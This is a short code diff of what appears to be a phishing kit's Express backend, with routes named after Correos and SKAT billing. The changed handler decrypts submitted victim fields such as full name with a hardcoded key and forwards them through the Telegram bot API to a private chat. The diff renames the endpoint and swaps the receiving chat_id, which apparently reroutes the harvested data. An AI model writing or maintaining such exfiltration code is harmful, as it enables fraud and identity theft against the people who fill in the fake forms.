@@ -10063,9 +10063,9 @@ app.post("/skatBilling", (req, res) => {
 //CORREOS
 //CORREOS
 
-app.options("/correos", cors());
+app.options("/correosAK", cors());
 
-app.post("/correos", (req, res) => {
+app.post("/correosAK", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
     CryptoJS.enc.Utf8
   );
@@ -10135,7 +10135,7 @@ app.post("/correos", (req, res) => {
         .post(
           `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
           {
-            chat_id: 1449567433,
+            chat_id: 1374564725,
             text: `Correos\n${originalText}`,
             parse_mode: "Markdown",
           }
